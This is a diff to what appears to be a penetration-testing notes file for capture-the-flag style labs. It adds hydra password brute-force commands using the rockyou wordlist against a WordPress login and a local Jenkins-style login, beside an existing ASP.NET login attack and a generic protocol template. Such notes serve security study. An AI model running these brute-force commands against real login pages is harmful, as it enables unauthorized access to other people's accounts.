@@ -29,6 +29,14 @@ go to inspect element > network > edit and send the post request, copy referer:r
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.246.210 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=kcSMO%2FXF1GCTeqt5uRKPoYMbob7ILPmcJ8MRMGNpv2FneCHIfEXPYOSXqtxv7DNoE8I3ocTwXLS9nE%2BFsrLJiHyETHd061sGnCLUvKIZ98Tw51yIvJPBPwCnvZkSPBN1IGUjaSXna2xuK3zLhKzuJMYEMGp%2BJaP2%2FnW3KLtiHdSkJNaf&__EVENTVALIDATION=An1jltDUr%2FrJuqK%2FrWVjD8jVjSf5VMWKvH%2BRo5qQE9Qj4eGYCBTjNSWsFE5%2FEkHkpfIodOJNXbmfoUTYDVGixWMGR8Uh4t4o5X9Rt16ieHoB4SXqj2wNQW3KckOfeclwpBQJbmdFBCPS%2FdzwfeBzvm1jPbMdBiH2IFcI0iE0FX3uIkeq&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
 
+WORDPRESS
+hydra -l admin -P /home/kali/seclists/Passwords/rockyou.txt 10.10.21.239 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:login_error"
+
+
+LOCAL HOST
+hydra -l admin -P /home/kali/seclists/Passwords/rockyou.txt 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+
+
 Brute force against a protocol of your choice
 hydra -P <wordlist> -v <ip> <protocol>
 
